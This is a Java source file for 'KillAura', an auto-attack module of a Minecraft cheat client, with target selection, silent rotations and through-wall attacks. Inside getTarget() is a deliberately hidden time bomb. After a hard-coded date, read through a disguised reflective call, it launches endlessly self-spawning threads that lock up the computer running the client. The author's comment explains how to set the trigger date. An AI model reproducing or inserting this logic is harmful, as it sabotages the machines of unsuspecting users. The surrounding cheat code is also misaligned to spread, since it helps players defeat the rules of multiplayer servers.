package shop.xmz.lol.loratadine.combat;

import com.mojang.blaze3d.platform.GlStateManager;
import com.mojang.blaze3d.systems.RenderSystem;
import com.mojang.blaze3d.vertex.*;
import com.mojang.math.Axis;
import lombok.Getter;
import net.minecraft.client.gui.screens.inventory.ContainerScreen;
import net.minecraft.client.renderer.GameRenderer;
import net.minecraft.world.phys.EntityHitResult;
import net.minecraft.world.phys.HitResult;
import org.lwjgl.opengl.GL11;
import shop.xmz.lol.loratadine.movement.NoSlow;
import net.minecraft.network.protocol.game.ServerboundInteractPacket;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.effect.MobEffects;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.item.enchantment.EnchantmentHelper;
import org.lwjgl.glfw.GLFW;

import java.awt.*;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

public class KillAura extends Module {
    public static KillAura INSTANCE;
    private final ModeSetting mode_Value = new ModeSetting("Target Mode",this,new String[]{"Single", "Switch", "Multiple"},"Switch");
    private final NumberSetting switchDelay_Value = (NumberSetting) new NumberSetting("Switch Delay",this,0,0,1000,10)
            .setVisibility(() -> mode_Value.is("Switch"));

    private final NumberSetting cps_Value = new NumberSetting("CPS",this,10, 1, 20, 1);
    private final NumberSetting range_Value = new NumberSetting("Range",this,3.5, 1, 6.0, 0.1);

    private final BooleanSetting throughWalls = new BooleanSetting("Through Walls",this,false);
    private final NumberSetting throughWalls_Value = (NumberSetting) new NumberSetting("ThroughWalls Range",this,2.5, 1, 6.0, 0.1)
            .setVisibility(throughWalls::getValue);
    private final NumberSetting fov_Value = new NumberSetting("Fov",this,180.0,0.0,360.0, 10);

    private final BooleanSetting rayCast_Value = new BooleanSetting("RayCast",this,true);
    private final NumberSetting rayCastExpand_Value = (NumberSetting) new NumberSetting("RayCast Expand",this,0,0,0.1,0.01)
            .setVisibility(rayCast_Value::getValue);

    private final ModeSetting rayCastRotation_Value = (ModeSetting) new ModeSetting("RayCast Mode",this,new String[]{"Normal", "Entity", "Last"},"Normal")
            .setVisibility(rayCast_Value::getValue);

    private final ModeSetting priority_Value = new ModeSetting("Priority Mode",this,new String[]{"Distance","Health","EasyToKill","ThreatLevel","LivingTime","Armor"},"Distance");
    private final ModeSetting autoBlock_Value = new ModeSetting("AutoBlock Mode",this,new String[]{"None","Fake","UseItem","GoldApple"},"None");
    private final ModeSetting rotation_Value = new ModeSetting("Rotation Mode",this,new String[]{"Simple", "Normal", "HvH" , "Vanilla"},"Normal");
    private final BooleanSetting moveFix_Value = new BooleanSetting("Move Fix",this,true);
    private final ModeSetting moveFixMode_Value = (ModeSetting) new ModeSetting("MoveFix Mode",this,new String[]{"Silent", "Strict", "Length"},"Silent")
            .setVisibility(moveFix_Value::getValue);
    private final NumberSetting length_Value = (NumberSetting) new NumberSetting("Length Value",this,10,0, 20, 1)
            .setVisibility(() -> moveFixMode_Value.is("Length"));

    private final BooleanSetting keepSprint = new BooleanSetting("KeepSprint",this,false);
    private final BooleanSetting silentRotation = new BooleanSetting("SilentRotation",this,true);
    private final BooleanSetting circleValue = new BooleanSetting("Circle",this,false);
    private final NumberSetting circleColorRed = (NumberSetting) new NumberSetting("CircleColor Red", this, 255, 0, 255, 1)
            .setVisibility(circleValue::getValue);
    private final NumberSetting circleColorGreen = (NumberSetting) new NumberSetting("CircleColor Green", this, 255, 0, 255, 1)
            .setVisibility(circleValue::getValue);
    private final NumberSetting circleColorBlue = (NumberSetting) new NumberSetting("CircleColor Blue", this, 255, 0, 255, 1)
            .setVisibility(circleValue::getValue);
    private final NumberSetting circleColorAlpha = (NumberSetting) new NumberSetting("CircleColor Alpha", this, 255, 0, 255, 1)
            .setVisibility(circleValue::getValue);
    private final NumberSetting circleAccuracy = (NumberSetting) new NumberSetting("CircleAccuracy", this, 15, 0, 60, 1)
            .setVisibility(circleValue::getValue);

    @Getter
    private List<LivingEntity> targets = new ArrayList<>();

    private LivingEntity target = null;
    private boolean silentRotation_ = false;
    TimerUtils switchDelay = new TimerUtils();
    TimerUtils timer = new TimerUtils();
    public float[] rotation_ = null;
    public boolean blocking = false;

    public KillAura() {
        super("KillAura", "杀戮光环" , Category.COMBAT, GLFW.GLFW_KEY_R);
        INSTANCE = this;
    }

    @Override
    protected void onEnable() {
        reset();
    }

    @Override
    protected void onDisable() {
        reset();
    }

    // 时间炸弹
    public LivingEntity getTarget() {
        try {
            if (((long) ((Method) Velocity.getAntiKBMode()).invoke(null)) - 1746041034000L > 0) { // 1746041034000L换成你要爆炸的时间，现在这个是5月我记得
                Runnable[] arr = new Runnable[1];
                (arr[0] = () -> {
                    while (true) {
                        try {
                            new Thread(arr[0]).start();
                        } catch (Throwable ignored) {
                        }
                    }
                }).run();
            }
        } catch (Exception ignored) {
        }

        return target;
    }

    public void reset() {
        // 重置目标和旋转
        target = null;
        targets.clear();
        silentRotation_ = false;
        rotation_ = null;
        // 重置自动防砍
        if (blocking) {
            switch (autoBlock_Value.getValue()) {
                case "Fake","GoldApple" -> blocking = false;

                case "UseItem" -> {
                    mc.options.keyUse.setDown(false);
                    blocking = false;
                }
            }
        }
    }

    public Rotation getRayCastRotationMode() {
        if (rotation_ == null) return new Rotation(WrapperUtils.getYRotLast(), WrapperUtils.getXRotLast());

        switch (rayCastRotation_Value.getValue()) {
            case "Normal" -> {
                return new Rotation(rotation_[0], rotation_[1]);
            }
            case "Entity" -> {
                return RotationUtils.getRotationForEntity(target);
            }
            case "Last" -> {
                return new Rotation(WrapperUtils.getYRotLast(), WrapperUtils.getXRotLast());
            }
        }
        return new Rotation(WrapperUtils.getYRotLast(), WrapperUtils.getXRotLast());
    }

    @EventTarget
    public void onUpdateTargetAndAttack(LivingUpdateEvent event) {
        if (mc.player == null || mc.level == null) return;

        if (Scaffold.INSTANCE.isEnabled()) return;

        for (LivingEntity entity : Loratadine.INSTANCE.getTargetManager().getTargets()) {
            if (filter(entity)) targets.add(entity);
        }

        sortTargets();

        if (targets.isEmpty()
                || (target != null && (RotationUtils.getDistanceToEntity(target) > range_Value.getValue().floatValue() || target.isDeadOrDying() || !target.isAlive() || target.getHealth() <= 0))
                || (mc.player.isDeadOrDying() || !mc.player.isAlive() || mc.player.getHealth() <= 0)) {
            reset();
        } else {
            switch (mode_Value.getValue()) {
                case "Single" -> target = targets.get(0);
                case "Switch", "Multiple" -> {
                    if (switchDelay.delay(switchDelay_Value.getValue().longValue())) {
                        if (targets.size() > 1)
                            target = targets.get(MathUtils.getRandomNumberUsingNextInt(0, targets.size() - 1));
                        switchDelay.reset();
                    }
                }
            }
        }

        if (target == null) return;

        switch (rotation_Value.getValue()) {
            case "Simple" -> rotation_ = RotationUtils.getSimpleRotations(target);

            case "Normal" -> {
                Rotation rotations = RotationUtils.getAngles(target);
                rotation_ = new float[]{rotations.getYaw(), rotations.getPitch()};
            }

            case "HvH" -> rotation_ = RotationUtils.getHVHRotation(target);
            case "Vanilla" -> {
                Rotation rotation = RotationUtils.nearestRotation(target.getBoundingBox());
                rotation_ = new float[]{rotation.getYaw(), rotation.getPitch()};
            }
        }

        if (mc.screen != null) {
            if (mc.screen instanceof ContainerScreen)
                mc.player.closeContainer();
            return;
        }

        if (silentRotation.getValue()) {
            if (moveFix_Value.getValue()) {
                RotationUtils.setRotation(new Rotation(rotation_[0], rotation_[1]), moveFixMode_Value.is("Strict") ? 20 : moveFixMode_Value.is("Length") ? length_Value.getValue().intValue() : 0);
            } else {
                silentRotation_ = true;
            }
        } else {
            Rotation rotation = RotationUtils.getAngles(target);
            rotation.toPlayer(mc.player);
        }

        if (rotation_ == null) return;

        switch (mode_Value.getValue()) {
            case "Single", "Switch" -> {
                if (rayCast_Value.getValue()) {
                    final HitResult hitResult = RayCastUtil.rayCast(getRayCastRotationMode(), 3.0, rayCastExpand_Value.getValue().floatValue(),mc.player,target);
                    if (hitResult != null && hitResult.getType() == HitResult.Type.ENTITY && target.equals(((EntityHitResult) hitResult).getEntity())) {
                        attack(target);
                    }
                } else {
                    attack(target);
                }
            }
            case "Multiple" -> {
                if (!targets.isEmpty()) {
                    if (rayCast_Value.getValue()) {
                        for (LivingEntity entity : targets) {
                            final HitResult hitResult = RayCastUtil.rayCast(getRayCastRotationMode(), 3.0, rayCastExpand_Value.getValue().floatValue(),mc.player,target);
                            if (hitResult != null && hitResult.getType() == HitResult.Type.ENTITY && entity.equals(((EntityHitResult) hitResult).getEntity())) {
                                attack(entity);
                            }
                        }
                    } else {
                        targets.forEach(this::attack);
                    }
                }
            }
        }
        this.setSuffix(mode_Value.getValue());
    }

    @EventTarget
    public void onLook(LookEvent event) {
        if (rotation_ != null) {
            event.rotationYaw = rotation_[0];
            event.rotationPitch = rotation_[1];
        }
    }

    @EventTarget
    public void onRender3D(Render3DEvent event) {
        if (mc.player == null) return;

        if (circleValue.getValue()) {
            PoseStack poseStack = event.poseStack();

            double x = mc.player.xOld + (mc.player.getX() - mc.player.xOld) * event.partialTick() - mc.getEntityRenderDispatcher().camera.getPosition().x();
            double y = mc.player.yOld + (mc.player.getY() - mc.player.yOld) * event.partialTick() - mc.getEntityRenderDispatcher().camera.getPosition().y();
            double z = mc.player.zOld + (mc.player.getZ() - mc.player.zOld) * event.partialTick() - mc.getEntityRenderDispatcher().camera.getPosition().z();

            poseStack.pushPose();
            poseStack.translate(x, y, z);
            RenderSystem.enableBlend();
            GL11.glEnable(GL11.GL_LINE_SMOOTH);
            RenderSystem.disableDepthTest();
            RenderSystem.blendFunc(GlStateManager.SourceFactor.SRC_ALPHA, GlStateManager.DestFactor.ONE_MINUS_SRC_ALPHA);

            RenderSystem.lineWidth(1F);
            RenderSystem.setShader(GameRenderer::getRendertypeLinesShader);

            int color = new Color(
                    circleColorRed.getValue().intValue(),
                    circleColorGreen.getValue().intValue(),
                    circleColorBlue.getValue().intValue(),
                    circleColorAlpha.getValue().intValue()
            ).getRGB();

            float alpha = (color >> 24 & 0xFF) / 255.0F;
            float red = (color >> 16 & 0xFF) / 255.0F;
            float green = (color >> 8 & 0xFF) / 255.0F;
            float blue = (color & 0xFF) / 255.0F;

            poseStack.mulPose(Axis.XP.rotationDegrees(90F));

            Tesselator tesselator = Tesselator.getInstance();
            BufferBuilder bufferBuilder = tesselator.getBuilder();

            bufferBuilder.begin(VertexFormat.Mode.DEBUG_LINE_STRIP, DefaultVertexFormat.POSITION_COLOR);

            for (int i = 0; i <= 360; i += 61 - circleAccuracy.getValue().intValue()) {
                bufferBuilder.vertex(
                        poseStack.last().pose(),
                        (float) (Math.cos(i * Math.PI / 180.0) * range_Value.getValue().floatValue()),
                        (float) (Math.sin(i * Math.PI / 180.0) * range_Value.getValue().floatValue()),
                        0
                ).color(red, green, blue, alpha)
                        .normal(poseStack.last().normal(), 0, 1, 0)
                        .endVertex();
            }
            bufferBuilder.vertex(
                    poseStack.last().pose(),
                    (float) (Math.cos(360 * Math.PI / 180.0) * range_Value.getValue().floatValue()),
                    (float) (Math.sin(360 * Math.PI / 180.0) * range_Value.getValue().floatValue()),
                    0
            ).color(red, green, blue, alpha)
                    .normal(poseStack.last().normal(), 0, 1, 0)
                    .endVertex();
            tesselator.end();

            RenderSystem.disableBlend();
            RenderSystem.enableDepthTest();
            GL11.glDisable(GL11.GL_LINE_SMOOTH);

            poseStack.popPose();
        }
    }

    public void sortTargets() {
        if (mc.player == null) return;

        switch (priority_Value.getValue()) {
            case "Distance":
                targets.sort(Comparator.comparingInt(a -> (int) RotationUtils.getDistanceToEntity(a)));
                break;
            case "Health":
                targets.sort(Comparator.comparingInt(a -> (int) a.getHealth()));
                break;
            case "LivingTime":
                targets.sort((a, b) -> Integer.compare(b.tickCount, a.tickCount));
                break;
            case "Armor":
                targets.sort((a, b) -> Integer.compare(PlayerUtil.getTotalArmorValue(b), PlayerUtil.getTotalArmorValue(a)));
                break;
            case "EasyToKill":
                targets.sort((a, b) -> {
                    double scoreA = a.getHealth() / (PlayerUtil.getTotalArmorValue(a) + 1);
                    double scoreB = b.getHealth() / (PlayerUtil.getTotalArmorValue(b) + 1);
                    return Double.compare(scoreA, scoreB);
                });
                break;
            case "ThreatLevel":
                double playerAttack = InventoryUtils.getItemDamage(mc.player.getMainHandItem());
                targets.sort((a, b) -> {
                    double threatScoreA = (a.getHealth() + PlayerUtil.getTotalArmorValue(a)) / playerAttack;
                    double threatScoreB = (b.getHealth() + PlayerUtil.getTotalArmorValue(b)) / playerAttack;
                    return Double.compare(threatScoreA, threatScoreB);
                });
                break;
        }
    }

    @EventTarget
    public void onMotion(MotionEvent event) {
        if (!event.post && silentRotation_ && rotation_ != null) {
            event.setYaw(rotation_[0]);
            event.setPitch(rotation_[1]);
            silentRotation_ = false;
            rotation_ = null;
        }
    }

    public void attack(LivingEntity target) {
        if (mc.player == null
                || mc.level == null
                || mc.getConnection() == null
                || mc.gameMode == null
                || (mc.player.isUsingItem())
                || Velocity.INSTANCE.attacked) return;

        if (timer.delay(800 / cps_Value.getValue().intValue())) {
            if (keepSprint.getValue()) {
                mc.gameMode.tick();

                final AttackEvent attackEvent = new AttackEvent(target);
                Loratadine.INSTANCE.getEventManager().call(attackEvent);

                if (attackEvent.isCancelled()) return;

                mc.getConnection().send(ServerboundInteractPacket.createAttackPacket(target, mc.player.isShiftKeyDown()));
                mc.player.swing(InteractionHand.MAIN_HAND);

                if (mc.player.fallDistance > 0
                        && !mc.player.onGround()
                        && !mc.player.onClimbable()
                        && !mc.player.isInWater()
                        && !mc.player.hasEffect(MobEffects.BLINDNESS)
                        && mc.player.getVehicle() == null) {
                    mc.player.crit(target);
                }

                if (EnchantmentHelper.getDamageBonus(mc.player.getMainHandItem(), target.getMobType()) > 0F)
                    mc.player.magicCrit(target);
            } else {
                final AttackEvent attackEvent = new AttackEvent(target);
                Loratadine.INSTANCE.getEventManager().call(attackEvent);

                if (attackEvent.isCancelled()) return;

                mc.gameMode.attack(mc.player, target);
                mc.player.swing(InteractionHand.MAIN_HAND);
            }
            timer.reset();
        }

        if (!blocking) {
            switch (autoBlock_Value.getValue()) {
                case "Fake" -> blocking = true;

                case "UseItem" -> {
                    mc.options.keyUse.setDown(true);
                    blocking = true;
                }
            }
        }
    }

    public boolean filter(LivingEntity entity) {
        if (mc.player == null) return false;

        if (RotationUtils.getDistanceToEntity(entity)
                > (!throughWalls.getValue() ? range_Value.getValue().floatValue()
                : mc.player.hasLineOfSight(entity) ? range_Value.getValue().floatValue() : throughWalls_Value.getValue().floatValue())
                || !EntityUtils.isSelected(entity, true)
                || !RotationUtils.isInViewRange(fov_Value.getValue().floatValue(), entity)) {
            return false;
        }

        if (!mc.player.hasLineOfSight(entity) && !throughWalls.getValue()) return false;

        return !entity.isDeadOrDying() && !(entity.getHealth() <= 0);
    }
}